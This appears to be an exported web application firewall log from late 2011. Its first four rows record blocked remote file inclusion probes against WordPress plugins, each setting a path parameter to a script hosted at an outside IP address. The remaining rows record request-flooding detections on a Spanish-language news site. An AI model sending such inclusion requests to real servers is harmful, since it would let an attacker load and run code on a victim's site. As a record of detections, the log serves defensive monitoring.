Date	Time	Cause	IP	Name	User agent	Request method	Request URI	Comment
2011-12-24	03:26:19	Image file name with command in URL	183.91.4.97	static.cmcti.vn	Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)	GET	/fwkfor/ajax/init.inc.php?wpabspath=http%3A%2F%2F62.76.188.27%2Finfo.txt%3F	
2011-12-24	03:26:23	Image file name with command in URL	183.91.4.97	static.cmcti.vn	Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)	GET	/wp-content/plugins/zingiri-web-shop/fws/ajax/init.inc.php?wpabspath=http%3A%2F%2F62.76.188.27%2Finfo.txt%3F	
2011-12-24	03:26:27	Image file name with command in URL	183.91.4.97	static.cmcti.vn	Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)	GET	/wp-content/plugins/annonces/includes/lib/photo/uploadPhoto.php?abspath=http%3A%2F%2F62.76.188.27%2Finfo.txt%3F	
2011-12-24	03:26:30	Image file name with command in URL	183.91.4.97	static.cmcti.vn	Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)	GET	/wp-content/plugins/enable-latex/core.php?url=http%3A%2F%2F62.76.188.27%2Finfo.txt%3F	
2011-12-28	12:25:13	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/component/contushdvideoshare/player/14/4.html	10 requests in less than 10 seconds (max = 10)
2011-12-28	12:25:18	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/105-ciudad/sonora-centro/556-revisaran-salidas-de-emergencia-en-casinos-de-hermosillo.html	10 requests in less than 10 seconds (max = 10)
2011-12-28	12:25:18	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/105-ciudad/sonora-centro/559-desalojan-a-decenas-de-familias-de-la-guayacan.html	11 requests in less than 10 seconds (max = 10)
2011-12-28	12:25:18	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/105-ciudad/sonora-centro/560-sin-luz-escuelas-del-fovissste.html	12 requests in less than 10 seconds (max = 10)
2011-12-28	12:25:19	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/programas/local/78-anuncian-empresarios-chilenos-inversiones-en-mexico.html	12 requests in less than 10 seconds (max = 10)
2011-12-28	12:25:19	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/programas/local/77-urge-pinera-a-convertir-a-mexico-y-a-chile-en-potencias.html	13 requests in less than 10 seconds (max = 10)
2011-12-28	12:25:19	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/programas/local/76-mexico-cae-1-0-ante-peru.html	14 requests in less than 10 seconds (max = 10)
2011-12-28	12:25:20	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/programas/local/75-rescata-marina-a-ex-alcalde-de-reynosa-secuestrado.html	13 requests in less than 10 seconds (max = 10)
2011-12-28	12:25:20	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/programas/local/74-politica-de-gasolinas-suaviza-volatilidad-global-banxico.html	14 requests in less than 10 seconds (max = 10)
2011-12-28	12:25:20	Flooding	159.253.145.175	159.253.145.175-static.reverse.softlayer.com	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0	GET	/programas/local/73-llega-el-sexto-aumento-de-2011-a-gasolinas.html	15 requests in less than 10 seconds (max = 10)
